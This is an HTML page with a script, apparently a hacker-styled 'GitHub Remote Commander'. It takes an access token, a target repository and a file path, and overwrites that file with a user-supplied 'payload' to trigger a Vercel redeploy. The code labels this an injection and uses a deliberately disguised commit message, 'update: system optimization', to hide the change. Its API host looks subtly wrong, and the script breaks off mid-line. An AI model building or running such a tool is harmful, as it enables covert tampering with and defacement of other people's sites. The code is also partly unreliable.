<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>INVICTUS - GitHub Deployer</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
        .box { border: 1px solid #00ff41; padding: 20px; margin-bottom: 20px; background: #0a0a0a; }
        input, textarea { width: 100%; background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 10px; margin: 10px 0; outline: none; }
        textarea { height: 300px; }
        button { background: #00ff41; color: #000; padding: 10px 20px; border: none; font-weight: bold; cursor: pointer; width: 100%; }
        button:hover { background: #fff; }
        .log { background: #111; padding: 10px; font-size: 12px; height: 100px; overflow-y: auto; border: 1px solid #333; }
    </style>
</head>
<body>

    <div class="box">
        <h2>GITHUB REMOTE COMMANDER</h2>
        <label>Personal Access Token (PAT):</label>
        <input type="password" id="ghToken" placeholder="ghp_xxxxxxxxxxxx">
        
        <label>Repo Path (Owner/RepoName):</label>
        <input type="text" id="ghRepo" placeholder="username/repository-target">
        
        <label>File to Inject (e.g., index.html):</label>
        <input type="text" id="ghPath" value="index.html">
    </div>

    <div class="box">
        <h2>PAYLOAD EDITOR (Auto Vercel Deploy)</h2>
        <textarea id="payloadCode" placeholder="Masukkan full code HTML/JS baru di sini..."></textarea>
        <button onclick="commitToGithub()">PUSH & REDEPLOY VERCEL</button>
    </div>

    <div class="log" id="statusLog">> System Ready...</div>

    <script>
        function addLog(msg) {
            const log = document.getElementById('statusLog');
            log.innerHTML += `<div>> ${msg}</div>`;
            log.scrollTop = log.scrollHeight;
        }

        async function commitToGithub() {
            const token = document.getElementById('ghToken').value;
            const repo = document.getElementById('ghRepo').value;
            const path = document.getElementById('ghPath').value;
            const newContent = document.getElementById('payloadCode').value;

            if(!token || !repo || !newContent) return alert("Data tidak lengkap!");

            addLog("Memulai proses injeksi ke GitHub...");

            try {
                // 1. Ambil SHA file lama (Wajib untuk update file di GitHub API)
                const getUrl = `https://api.github.org/repos/${repo}/contents/${path}`;
                const res = await fetch(getUrl, {
                    headers: { "Authorization": `token ${token}` }
                });
                const data = await res.json();
                const sha = data.sha;

                addLog("File SHA ditemukan: " + sha);

                // 2. Push Update
                const updateUrl = `https://api.github.org/repos/${repo}/contents/${path}`;
                const pushRes = await fetch(updateUrl, {
                    method: "PUT",
                    headers: {
                        "Authorization": `token ${token}`,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        message: "update: system optimization", // Pesan commit samaran
                        content: btoa(unescape(encodeURIComponent(newContent))), // Encode ke Base64
                        sha: sha
                    })
                });

                if(pushRes.ok) {
                    addLog("SUCCESS: Kode berhasil di
